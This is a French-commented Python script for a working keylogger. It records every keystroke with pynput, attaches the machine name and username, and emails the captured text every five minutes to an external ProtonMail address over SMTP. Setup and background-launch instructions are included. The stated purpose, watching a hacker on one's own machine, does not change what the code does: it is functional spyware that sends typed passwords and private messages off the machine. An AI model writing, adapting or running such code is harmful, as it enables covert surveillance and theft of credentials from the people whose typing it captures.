#!/usr/bin/env python3
"""
klm.py - Keylogger sécurisé avec envoi par email
UTILISATION UNIQUE : Surveiller un hacker sur VOTRE propre machine

# 1. Installe les dépendances
pip install pynput cryptography

# 2. Configure le script
#    - Ouvre le fichier et modifie EMAIL_CONFIG
#    - Mets ton email dans 'receiver'

# 3. Pour utiliser un serveur SMTP local (RECOMMANDÉ):
python -m smtpd -n -c DebuggingServer localhost:1025
# Garde cette fenêtre ouverte

# 4. Dans une NOUVELLE fenêtre CMD (Admin):
python klm.py

"""
# ================= CONFIGURATION =================
# LOCAL / Le hacker ne pourra pas intercepter les emails si tu utilises un serveur SMTP local :

# LANCER / le server SMTP local = python -m smtpd -n -c DebuggingServer localhost:1025
# LANCER / arrière-plan = start /B python klm.py


import sys
import os
import smtplib
import threading
import time
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Listener, Key

"""# ================= CONFIGURATION =================
CONFIG = {
    'EMAIL_TO': '****@proton.me',
    'EMAIL_FROM': 'surveillance@local',  # Change si tu as un vrai SMTP
    'SMTP_SERVER': '127.0.0.1',  # Serveur local - CHANGE POUR PROTONMAIL
    'SMTP_PORT': 1025,
    'USE_TLS': False,
    
    'SEND_INTERVAL': 300,  # Envoyer toutes les 5 minutes (secondes)
    'MIN_CHARS_TO_SEND': 100,  # Min caractères avant envoi
    'STOP_KEYWORD': 'STOPLOG',
}"""
CONFIG = {
    'EMAIL_TO': '****@proton.me',
    'EMAIL_FROM': '****@proton.me',
    'SMTP_SERVER': 'smtp.protonmail.ch',  # Change en 'smtp.protonmail.ch'
    'SMTP_PORT': 587,  # Port ProtonMail
    'USE_TLS': True,
    'SEND_INTERVAL': 300,  # Envoyer toutes les 5 minutes (secondes)
    'MIN_CHARS_TO_SEND': 100,  # Min caractères avant envoi
    'STOP_KEYWORD': 'STOPLOG',
    # Ajoute si besoin:
    # 'EMAIL_USER': 'ton_email@proton.me',
    # 'EMAIL_PASSWORD': 'ton_mot_de_passe',
}
# ================= ACTIVATION VENV AUTOMATIQUE =================
def activate_venv():
    """Active le venv parent automatiquement"""
    try:
        # Cherche le venv dans le parent
        current_dir = os.path.dirname(os.path.abspath(__file__))
        parent_dir = os.path.dirname(current_dir)
        venv_path = os.path.join(parent_dir, '.venv')
        
        if os.path.exists(venv_path):
            activate_script = os.path.join(venv_path, 'Scripts', 'activate_this.py')
            if os.path.exists(activate_script):
                with open(activate_script) as f:
                    exec(f.read(), {'__file__': activate_script})
                print(f"[INFO] Venv activé: {venv_path}")
                return True
    except Exception as e:
        print(f"[WARN] Venv non activé: {e}")
    
    return False

# ================= GESTION DES LOGS =================
class KeyLogger:
    def __init__(self):
        self.buffer = ""
        self.log_entries = []
        self.is_running = True
        self.last_send_time = time.time()
        self.email_thread = None
        
    def format_key(self, key):
        """Formate une touche pour affichage lisible"""
        try:
            # Caractères normaux
            if hasattr(key, 'char') and key.char:
                return key.char
        except AttributeError:
            pass
        
        # Touches spéciales avec symboles
        special_keys = {
            Key.space: ' ',
            Key.enter: '\n',
            Key.tab: '\t',
            Key.backspace: '⌫',
            Key.esc: '⎋',
            Key.shift: '⇧',
            Key.ctrl_l: '⌃', Key.ctrl_r: '⌃',
            Key.alt_l: '⌥', Key.alt_r: '⌥',
            Key.cmd: '❖',
            Key.caps_lock: '⇪',
        }
        
        if key in special_keys:
            return special_keys[key]
        
        # Autres touches (F1, etc.)
        key_name = str(key).replace('Key.', '')
        return f'[{key_name}]'
    
    def format_buffer_horizontal(self):
        """Formate le buffer en texte lisible horizontal"""
        lines = []
        current_line = ""
        
        for char in self.buffer:
            if char == '\n':
                if current_line:
                    lines.append(current_line)
                    current_line = ""
                lines.append("")  # Ligne vide pour saut de ligne
            elif char == '\t':
                current_line += "    "  # 4 espaces pour tab
            elif char == '⌫':  # Backspace
                current_line = current_line[:-1] if current_line else ""
            else:
                current_line += char
                
                # Nouvelle ligne tous les 80 caractères
                if len(current_line) >= 80 and char == ' ':
                    lines.append(current_line)
                    current_line = ""
        
        if current_line:
            lines.append(current_line)
        
        return '\n'.join(lines)
    
    def send_email_report(self):
        """Envoie les logs par email"""
        if len(self.buffer) < CONFIG['MIN_CHARS_TO_SEND']:
            return False
        
        try:
            # Formater le contenu
            formatted_logs = self.format_buffer_horizontal()
            
            # Préparer l'email
            msg = MIMEMultipart()
            msg['From'] = CONFIG['EMAIL_FROM']
            msg['To'] = CONFIG['EMAIL_TO']
            msg['Subject'] = f"Rapport Keylogger - {datetime.now().strftime('%d/%m/%Y %H:%M')}"
            
            # Corps du message
            body = f"""
🔐 SURVEILLANCE CLAVIER - RAPPORT AUTOMATIQUE
===========================================
Date: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
Caractères capturés: {len(self.buffer)}
Durée: {time.time() - self.last_send_time:.0f}s
Machine: {os.environ.get('COMPUTERNAME', 'Inconnue')}
Utilisateur: {os.environ.get('USERNAME', 'Inconnu')}

📝 CONTENU CAPTURÉ:
===========================================
{formatted_logs}

⚠️ Ce rapport est généré automatiquement.
Mot d'arrêt: {CONFIG['STOP_KEYWORD']}
            """
            
            msg.attach(MIMEText(body, 'plain', 'utf-8'))
            
            # Envoi via SMTP local (recommandé pour discrétion)
            if CONFIG['SMTP_SERVER'] == '127.0.0.1':
                # Mode local - nécessite un serveur SMTP local
                with smtplib.SMTP(CONFIG['SMTP_SERVER'], CONFIG['SMTP_PORT']) as server:
                    server.sendmail(CONFIG['EMAIL_FROM'], CONFIG['EMAIL_TO'], msg.as_string())
            else:
                # Mode réel avec authentification
                with smtplib.SMTP(CONFIG['SMTP_SERVER'], CONFIG['SMTP_PORT']) as server:
                    if CONFIG['USE_TLS']:
                        server.starttls()
                    # Note: Ajoute login si nécessaire
                    # server.login(email_user, email_password)
                    server.send_message(msg)
            
            print(f"[EMAIL] Rapport envoyé ({len(self.buffer)} caractères)")
            self.buffer = ""  # Vider le buffer après envoi
            self.last_send_time = time.time()
            return True
            
        except Exception as e:
            print(f"[ERREUR Email] {e}")
            # Sauvegarde locale en cas d'échec
            backup_file = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(backup_file, 'w', encoding='utf-8') as f:
                f.write(self.buffer)
            print(f"[BACKUP] Sauvegardé dans {backup_file}")
            return False
    
    def email_sender_daemon(self):
        """Thread qui envoie périodiquement les emails"""
        while self.is_running:
            time.sleep(CONFIG['SEND_INTERVAL'])
            self.send_email_report()
    
    def on_press(self, key):
        """Callback pour les frappes"""
        formatted_key = self.format_key(key)
        self.buffer += formatted_key
        self.log_entries.append(formatted_key)
        
        # Détection du mot d'arrêt
        if CONFIG['STOP_KEYWORD'] in self.buffer:
            print(f"[ARRÊT] Mot-clé '{CONFIG['STOP_KEYWORD']}' détecté")
            self.send_email_report()  # Dernier envoi
            self.is_running = False
            return False
    
    def on_release(self, key):
        """Callback pour le relâchement"""
        if key == Key.esc:
            print("[ARRÊT] Touche Échap pressée")
            self.send_email_report()  # Dernier envoi
            self.is_running = False
            return False
    
    def run(self):
        """Lance le keylogger"""
        print("=" * 60)
        print("KEYLOGGER AVEC ENVOI EMAIL")
        print("=" * 60)
        print(f"Email de destination: {CONFIG['EMAIL_TO']}")
        print(f"Intervalle d'envoi: {CONFIG['SEND_INTERVAL']}s")
        print(f"Mot d'arrêt: '{CONFIG['STOP_KEYWORD']}' ou Échap")
        print(f"Format: Horizontal lisible")
        print("=" * 60)
        print("\nSurveillance active...\n")
        
        # Démarrer le thread d'envoi email
        self.email_thread = threading.Thread(target=self.email_sender_daemon, daemon=True)
        self.email_thread.start()
        
        # Démarrer l'écoute du clavier
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        
        self.is_running = False
        print("\n" + "=" * 60)
        print("SURVEILLANCE TERMINÉE")
        print("=" * 60)

# ================= LANCEUR =================
if __name__ == "__main__":
    # Activer le venv automatiquement
    activate_venv()
    
    # Démarrer le keylogger
    logger = KeyLogger()
    
    try:
        logger.run()
    except KeyboardInterrupt:
        print("\n[INTERRUPTION] Arrêt manuel")
        logger.send_email_report()
    except Exception as e:
        print(f"[ERREUR] {e}")
        import traceback
        traceback.print_exc()
        input("\nAppuyez sur Entrée pour quitter...")